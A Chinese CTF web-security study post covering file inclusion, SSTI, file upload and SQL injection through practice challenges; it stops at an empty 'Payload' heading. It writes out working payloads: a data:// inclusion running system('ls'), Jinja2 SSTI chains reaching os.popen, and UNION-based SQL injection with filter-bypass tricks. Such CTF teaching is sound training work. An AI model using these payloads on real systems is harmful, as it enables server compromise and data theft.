<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Web基础 | PureStream &amp; Marblue</title><meta name="author" content="Pure Stream"><meta name="copyright" content="Pure Stream"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Web基础(暂定，持续更新)每个知识点后面都会附带若干例题进行讲解，覆盖基础到综合 刷题网站https:&#x2F;&#x2F;www.polarctf.com&#x2F;#&#x2F;page&#x2F;challenges POLAR靶场 题库 | NSSCTF NSS BUUCTF在线评测 BUU 攻防世界 攻防世界 登录 春秋云镜（Web渗透） CTFHub CTFhub …. 常用工具maurosoria&#x2F;dirsearch:">
<meta property="og:type" content="article">
<meta property="og:title" content="Web基础">
<meta property="og:url" content="https://purestream108.github.io/project/2025/05/17/Web%E5%9F%BA%E7%A1%80/index.html">
<meta property="og:site_name" content="PureStream &amp; Marblue">
<meta property="og:description" content="Web基础(暂定，持续更新)每个知识点后面都会附带若干例题进行讲解，覆盖基础到综合 刷题网站https:&#x2F;&#x2F;www.polarctf.com&#x2F;#&#x2F;page&#x2F;challenges POLAR靶场 题库 | NSSCTF NSS BUUCTF在线评测 BUU 攻防世界 攻防世界 登录 春秋云镜（Web渗透） CTFHub CTFhub …. 常用工具maurosoria&#x2F;dirsearch:">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://purestream108.github.io/project/img/purestream.jpg">
<meta property="article:published_time" content="2025-05-17T15:00:30.000Z">
<meta property="article:modified_time" content="2025-05-17T15:02:53.601Z">
<meta property="article:author" content="Pure Stream">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://purestream108.github.io/project/img/purestream.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Web基础",
  "url": "https://purestream108.github.io/project/2025/05/17/Web%E5%9F%BA%E7%A1%80/",
  "image": "https://purestream108.github.io/project/img/purestream.jpg",
  "datePublished": "2025-05-17T15:00:30.000Z",
  "dateModified": "2025-05-17T15:02:53.601Z",
  "author": [
    {
      "@type": "Person",
      "name": "Pure Stream",
      "url": "https://purestream108.github.io/project/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/marblue.jpg"><link rel="canonical" href="https://purestream108.github.io/project/2025/05/17/Web%E5%9F%BA%E7%A1%80/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.3.0-b3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: Pure Stream","link":"链接: ","source":"来源: PureStream & Marblue","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Web基础',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"><link rel="stylesheet" href="/css/prism.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/lazy.gif" data-original="/img/purestream.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/bangumis/"><i class="fa-fw fas fa-heart"></i><span> Animation</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/l1.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">PureStream &amp; Marblue</span></a><a class="nav-page-title" href="/"><span class="site-name">Web基础</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/bangumis/"><i class="fa-fw fas fa-heart"></i><span> Animation</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Web基础</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-17T15:00:30.000Z" title="发表于 2025-05-17 23:00:30">2025-05-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-05-17T15:02:53.601Z" title="更新于 2025-05-17 23:02:53">2025-05-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Web基础-暂定，持续更新"><a href="#Web基础-暂定，持续更新" class="headerlink" title="Web基础(暂定，持续更新)"></a>Web基础(暂定，持续更新)</h1><p>每个知识点后面都会附带若干例题进行讲解，覆盖基础到综合</p>
<h2 id="刷题网站"><a href="#刷题网站" class="headerlink" title="刷题网站"></a>刷题网站</h2><p><a target="_blank" rel="noopener" href="https://www.polarctf.com/#/page/challenges">https://www.polarctf.com/#/page/challenges</a> POLAR靶场</p>
<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem">题库 | NSSCTF</a> NSS</p>
<p><a target="_blank" rel="noopener" href="https://buuoj.cn/login?next=/challenges?">BUUCTF在线评测</a> BUU</p>
<p><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list">攻防世界</a> 攻防世界</p>
<p><a target="_blank" rel="noopener" href="https://yunjing.ichunqiu.com/login">登录</a> 春秋云镜（Web渗透）</p>
<p><a target="_blank" rel="noopener" href="https://www.ctfhub.com/#/index">CTFHub</a> CTFhub</p>
<p>….</p>
<h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h2><p><a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch">maurosoria&#x2F;dirsearch: Web path scanner</a> Dirsearch目录扫描工具</p>
<p>[<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/]">https://github.com/AntSwordProject/]</a> 蚁剑</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Marven11/FenJing">Marven11&#x2F;Fenjing: 专为CTF设计的Jinja2 SSTI全自动绕WAF脚本 | A Jinja2 SSTI cracker for bypassing WAF, designed for CTF</a> Fenjing</p>
<p><a target="_blank" rel="noopener" href="https://old.xp.cn/download.html">Windows版phpstudy下载 - 小皮面板(phpstudy)</a> Phpstudy (用来展示运行php代码的结果)</p>
<p><a target="_blank" rel="noopener" href="https://github.com/notepad-plus-plus/notepad-plus-plus/releases/">发布 ·记事本加加&#x2F;记事本加加</a> NotePad++</p>
<p>….</p>
<h2 id="源码查看"><a href="#源码查看" class="headerlink" title="源码查看"></a>源码查看</h2><p>基本查看+各个浏览器的快捷键（视情况可略过）</p>
<h2 id="控制台-游戏"><a href="#控制台-游戏" class="headerlink" title="控制台+游戏"></a>控制台+游戏</h2><p>前端JS改变量值和JS部分审计（主要是CTF前端游戏部分）（结合最近五一的mini-LCTF）</p>
<p><a target="_blank" rel="noopener" href="https://ctf.xidian.edu.cn/training/18?challenge=822">Mini L-CTF 2025 - 西电 CTF 终端</a>  GuessOneGuess Miniup</p>
<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>改浏览器信息+改本地地址+改地址+VPN+POST&#x2F;GET…..（视情况可略过）</p>
<p><img src="/img/lazy.gif" data-original="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250512100340274.png" alt="image-20250512100340274"></p>
<p><img src="/img/lazy.gif" data-original="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250512100414377.png" alt="image-20250512100414377"></p>
<p><img src="/img/lazy.gif" data-original="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250512100427182.png" alt="image-20250512100427182"></p>
<p>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3740">GDOUCTF 2023]EZ WEB | NSSCTF</a> PUT</p>
<p>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3408">MoeCTF 2021]Do you know HTTP | NSSCTF</a></p>
<p>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF">https://buuoj.cn/challenges#[NewStarCTF</a> 2023 公开赛道]Begin of HTTP)</p>
<h2 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h2><p>介绍常见的正则表达式与语法</p>
<h2 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h2><p>例题为主</p>
<h3 id="BUUCTF在线评测-https-buuoj-cn-challenges-NewStarCTF-2023-公开赛道-Begin-of-PHP"><a href="#BUUCTF在线评测-https-buuoj-cn-challenges-NewStarCTF-2023-公开赛道-Begin-of-PHP" class="headerlink" title="[BUUCTF在线评测](https://buuoj.cn/challenges#[NewStarCTF 2023 公开赛道]Begin of PHP)"></a>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF">https://buuoj.cn/challenges#[NewStarCTF</a> 2023 公开赛道]Begin of PHP)</h3><p><strong>MD5比较：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br></pre></td></tr></table></figure>

<p><strong>数组可以绕过正则匹配</strong></p>
<p><strong>extract覆盖漏洞</strong></p>
<p><strong>数组也可以绕过strcmp比较</strong></p>
<h3 id="BUUCTF在线评测-https-buuoj-cn-challenges-NewStarCTF-2023-公开赛道-R-C-E"><a href="#BUUCTF在线评测-https-buuoj-cn-challenges-NewStarCTF-2023-公开赛道-R-C-E" class="headerlink" title="[BUUCTF在线评测](https://buuoj.cn/challenges#[NewStarCTF 2023 公开赛道]R!C!E!)"></a>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF">https://buuoj.cn/challenges#[NewStarCTF</a> 2023 公开赛道]R!C!E!)</h3><p>主要是一个md5的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;c4d038&quot;</span>  <span class="comment"># 目标MD5值的前六位</span></span><br><span class="line">prefix_bytes = prefix.encode()  <span class="comment"># 将前缀转换为字节串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000</span>):</span><br><span class="line">    b = i.to_bytes(<span class="number">22</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    m = hashlib.md5(<span class="built_in">str</span>(i).encode()).hexdigest()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> m.startswith(prefix):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p> [ 绕过 _</p>
<h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p><img src="/img/lazy.gif" data-original="https://i-blog.csdnimg.cn/blog_migrate/f4f460a7e99d561e19b63142a1cf9751.png" alt="img"></p>
<p><strong>data 伪协议 格式：</strong><br><code>data://[&lt;MIME-type&gt;][;charset=][;base64],&lt;data&gt;</code></p>
<ul>
<li><strong>MIME-type：</strong>指定数据的类型，默认是 text&#x2F;plain。</li>
<li><strong>charset：</strong>指定数据的编码类型，如 utf-8。</li>
<li><strong>base64：</strong>如果使用 Base64 编码，则加上该标识。</li>
<li><strong>data：</strong>实际的数据内容。</li>
</ul>
<p><strong>text&#x2F;plain 的具体含义</strong></p>
<p><strong>text&#x2F;plain MIME 类型：</strong></p>
<ol>
<li>表示数据是普通文本文件，没有任何特定的格式或编码。</li>
<li>在 PHP 的文件包含漏洞中，当使用 data:&#x2F;&#x2F;text&#x2F;plain 时，PHP 会将数据视为纯文本进行读取。</li>
<li>但是，如果该文本数据本身是 PHP 代码（如<code> &lt;?php system(&#39;ls&#39;); ?&gt;</code>），且它被 include()、require() 等函数加载，那么它会被当作 PHP 代码解析和执行。</li>
</ol>
<p><strong>data:&#x2F;&#x2F;text&#x2F;plain 的实际作用</strong></p>
<p>在 LFI 漏洞中使用 data:&#x2F;&#x2F;text&#x2F;plain 可以让我们通过 URL 注入 PHP 代码，并且这些代码会在服务器端执行。</p>
<p><strong>示例：执行系统命令</strong></p>
<p><strong>URL：</strong></p>
<p><code>?file=data://text/plain,&lt;?php system(&#39;ls&#39;); ?&gt;</code></p>
<p><strong>解释：</strong></p>
<ul>
<li>data:&#x2F;&#x2F; 告诉 PHP 加载内联数据。</li>
<li>text&#x2F;plain 表示数据是纯文本类型，但在通过 include() 加载时，PHP 会解析文本中的代码片段（如 <code>&lt;?php system(&#39;ls&#39;); ?&gt;</code>），并将其执行。</li>
</ul>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>include和file_get_content</p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>[CTF show 文件上传篇（web151-170，看这一篇就够啦）-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_65165505/article/details/141370798#:~:text=%E5%9C%A8%E6%88%91%E4%BB%AC%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%90%8E%EF%BC%8C%E7%BD%91%E7%AB%99%E4%BC%9A%E5%AF%B9%E5%9B%BE%E7%89%87%E8%BF%9B%E8%A1%8C%E4%BA%8C%E6%AC%A1%E5%A4%84%E7%90%86%EF%BC%88%E6%A0%BC%E5%BC%8F%E3%80%81%E5%B0%BA%E5%AF%B8%E8%A6%81%E6%B1%82%E7%AD%89%EF%BC%89%EF%BC%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BC%9A%E6%8A%8A%E9%87%8C%E9%9D%A2%E7%9A%84%E5%86%85%E5%AE%B9%E8%BF%9B%E8%A1%8C%E6%9B%BF%E6%8D%A2%E6%9B%B4%E6%96%B0%EF%BC%8C%E5%A4%84%E7%90%86%E5%AE%8C%E6%88%90%E5%90%8E%EF%BC%8C%E6%A0%B9%E6%8D%AE%E6%88%91%E4%BB%AC%E5%8E%9F%E6%9C%89%E7%9A%84%E5%9B%BE%E7%89%87%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84%E5%9B%BE%E7%89%87%E5%B9%B6%E6%94%BE%E5%88%B0%E7%BD%91%E7%AB%99%E5%AF%B9%E5%BA%94%E7%9A%84%E6%A0%87%E7%AD%BE%E8%BF%9B%E8%A1%8C%E6%98%BE%E7%A4%BA%E3%80%82,%E5%B0%86%E4%B8%80%E4%B8%AA%E6%AD%A3%E5%B8%B8%E6%98%BE%E7%A4%BA%E7%9A%84%E5%9B%BE%E7%89%87%EF%BC%8C%E4%B8%8A%E4%BC%A0%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%82">https://blog.csdn.net/qq_65165505/article/details/141370798#:~:text=在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示。,将一个正常显示的图片，上传到服务器。</a> 寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。)</p>
<h3 id="1-普通php-phtml文件上传"><a href="#1-普通php-phtml文件上传" class="headerlink" title="(1)普通php&#x2F;phtml文件上传"></a>(1)普通php&#x2F;phtml文件上传</h3><h3 id="2-通过burpsuite拦截抓包更改后缀"><a href="#2-通过burpsuite拦截抓包更改后缀" class="headerlink" title="(2)通过burpsuite拦截抓包更改后缀"></a>(2)通过burpsuite拦截抓包更改后缀</h3><h4 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list">攻防世界</a></h4><p>就是个简单的拦截改成后缀为php</p>
<h3 id="3-通过-htaccess或者user-ini进行文件上传"><a href="#3-通过-htaccess或者user-ini进行文件上传" class="headerlink" title="(3)通过.htaccess或者user.ini进行文件上传"></a>(3)通过.htaccess或者user.ini进行文件上传</h3><p>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF">https://buuoj.cn/challenges#[NewStarCTF</a> 2023 公开赛道]Upload again!) 运用.htaccess</p>
<h3 id="4-通过文件名传马"><a href="#4-通过文件名传马" class="headerlink" title="(4)通过文件名传马"></a>(4)通过文件名传马</h3><p>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[CISCN2019">https://buuoj.cn/challenges#[CISCN2019</a> 总决赛 Day2 Web1]Easyweb)</p>
<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>分为 <strong>原理</strong>+<strong>基础</strong>+<strong>综合绕过</strong></p>
<h3 id="1-原理"><a href="#1-原理" class="headerlink" title="(1)原理"></a>(1)原理</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU/articles/18442823">CTF web漏洞合集 Python篇（1）python中的SSTI - LamentXU - 博客园</a></p>
<h3 id="2-基础"><a href="#2-基础" class="headerlink" title="(2)基础"></a>(2)基础</h3><h4 id="RUST下的SSTI"><a href="#RUST下的SSTI" class="headerlink" title="RUST下的SSTI"></a>RUST下的SSTI</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set my_var = <span class="title function_ invoke__">get_env</span>(name=<span class="string">&quot;FLAG&quot;</span>) %&#125;&#123;&#123;my_var&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="HNCTF-2022-WEEK2-ez-SSTI-NSSCTF"><a href="#HNCTF-2022-WEEK2-ez-SSTI-NSSCTF" class="headerlink" title="[HNCTF 2022 WEEK2]ez_SSTI | NSSCTF"></a>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2953">HNCTF 2022 WEEK2]ez_SSTI | NSSCTF</a></h4><p>参数是name，测试得出模板是<code>jinja2</code>。</p>
<p><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()&#125;&#125;</code></p>
<p>用这个找到<code>os._wrap_close</code>类。定位到了<code>137</code></p>
<p>然后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>查找用没有popen函数</p>
<p>发现有</p>
<p>则payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>



<h3 id="3-综合绕过"><a href="#3-综合绕过" class="headerlink" title="(3)综合绕过"></a>(3)综合绕过</h3><h4 id="攻防世界-Web-python-template-injection"><a href="#攻防世界-Web-python-template-injection" class="headerlink" title="攻防世界 Web_python_template_injection"></a><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list">攻防世界</a> Web_python_template_injection</h4><p><code>&#123;&#123;[].__class__.__base__.__subclasses__()[138].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls').read()")&#125;&#125;</code></p>
<p><code>&#123;&#123;[].__class__.__base__.__subclasses__()[138].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('tac f14g').read()")&#125;&#125;</code></p>
<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p><strong>判断字段数：</strong></p>
<ul>
<li>order by</li>
</ul>
<p><strong>information_schema数据库</strong></p>
<ul>
<li><strong>schemata</strong>: 保存当前整个服务器所有的数据库信息 库名</li>
<li><strong>tables</strong>: 保存当前整个服务器所有的数据表的信息 表名 table_name</li>
<li><strong>columns</strong>: 保存当前整个服务器所有的字段信息 字段名</li>
<li><strong>group_concat</strong>: 去重</li>
</ul>
<h3 id="1-联合查询"><a href="#1-联合查询" class="headerlink" title="(1)联合查询"></a>(1)联合查询</h3><h4 id="攻防世界-NewsCenter"><a href="#攻防世界-NewsCenter" class="headerlink" title="攻防世界 NewsCenter"></a><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list">攻防世界</a> NewsCenter</h4><p><code>1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database()#</code></p>
<p>&#x2F;&#x2F;news secret_table</p>
<p><code>1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#39;secret_table&#39;#</code></p>
<p>&#x2F;&#x2F;id f14g</p>
<p><code>1&#39; union select 1,2,group_concat(fl4g) from secret_table#</code></p>
<p>&#x2F;&#x2F; QCTF{sq1_inJec7ion_ezzz}</p>
<h4 id="BUUCTF在线评测-https-buuoj-cn-challenges-极客大挑战-2019-BabySQL-Baby-SQL（双写绕过）"><a href="#BUUCTF在线评测-https-buuoj-cn-challenges-极客大挑战-2019-BabySQL-Baby-SQL（双写绕过）" class="headerlink" title="[BUUCTF在线评测](https://buuoj.cn/challenges#[极客大挑战 2019]BabySQL) Baby SQL（双写绕过）"></a>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98">https://buuoj.cn/challenges#[极客大挑战</a> 2019]BabySQL) Baby SQL（双写绕过）</h4><p><strong>试列数：</strong><code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1,2,3%23</code>（这个URL编码是#）</p>
<p><strong>爆数据库：</strong><code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1,2,group_concat(schema_name)frfromom(infoorrmation_schema.schemata) %23</code></p>
<p><strong>爆表：</strong><code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1,2, group_concat(table_name)frfromom(infoorrmation_schema.tables) whwhereere table_schema=&quot;ctf&quot; %23</code></p>
<p><strong>查字段名：</strong><code>/check.php?username=admin&amp;password=pwd &#39; ununionion seselectlect 1,2,group_concat(column_name) frfromom (infoorrmation_schema.columns) whwhereere table_name=&quot;Flag&quot;%23</code></p>
<p><code>/check.php?username=admin&amp;password=pwd &#39; ununionion seselectlect 1,2,group_concat(flag) frfromom(ctf.Flag)%23</code></p>
<p>PS: <strong>(双写绕过)</strong></p>
<p>因为在过滤过程中只进行了一次替换。就是将关键字替换为对应的空。</p>
<p>比如 union在程序员处理时被替换为空，那需要我们可以尝试把union改写为 un<font color="red">union</font>ion ，这样红色部分替换为空，则剩下的依然为union还可以结合大小写过滤一起使用</p>
<h4 id="BUUCTF在线评测-https-buuoj-cn-challenges-NewStarCTF-2023-公开赛道-ez-sql-EZ-sql（大小写绕过）"><a href="#BUUCTF在线评测-https-buuoj-cn-challenges-NewStarCTF-2023-公开赛道-ez-sql-EZ-sql（大小写绕过）" class="headerlink" title="[BUUCTF在线评测](https://buuoj.cn/challenges#[NewStarCTF 2023 公开赛道]ez_sql) EZ_sql（大小写绕过）"></a>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF">https://buuoj.cn/challenges#[NewStarCTF</a> 2023 公开赛道]ez_sql) EZ_sql（大小写绕过）</h4><p>Payload：</p>
